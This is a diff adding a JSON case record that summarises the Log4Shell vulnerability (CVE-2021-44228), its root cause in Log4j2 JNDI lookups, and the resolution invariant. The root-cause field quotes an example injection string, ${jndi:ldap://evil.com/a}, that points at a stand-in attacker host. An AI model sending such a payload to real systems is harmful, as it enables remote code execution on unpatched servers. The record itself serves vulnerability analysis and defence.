@@ -1,0 +1,10 @@
+{
+  "id": "CS_SYS_005",
+  "title": "Log4Shell (CVE-2021-44228) — JNDI injection via log message",
+  "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+  "language": "Java",
+  "domains": ["D_SUPPLY_CHAIN_SECURITY", "D_NETWORKING", "D_INCIDENT_RESPONSE"],
+  "root_cause": "Log4j2 performs JNDI lookups on user-controlled log message content. String interpolation in logging framework has no sandboxing. Attacker sends ${jndi:ldap://evil.com/a} in any logged field.",
+  "resolution_type": "Invariant: log message interpolation MUST NOT perform network calls. Lookup functionality disabled by default. Input sanitization before logging.",
+  "status": "ANALYZED"
+}
